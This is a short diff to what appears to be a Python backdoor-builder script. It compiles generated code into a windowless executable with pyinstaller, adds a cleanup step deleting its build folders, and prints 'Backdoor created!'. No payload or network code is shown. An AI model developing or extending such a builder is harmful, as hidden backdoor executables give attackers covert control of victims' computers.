@@ -83,6 +83,7 @@ try:
     f.write (maket)
     f.close ()
     system ('pyinstaller --noconsole ' + argv [-1])
+    system ('rm -R dest build')
     print Fore.CYAN + '[*] ' + Fore.RESET + ' Backdoor created!'
 except:
     print Fore.RED + '[!]' + Fore.RESET + ' Error!'
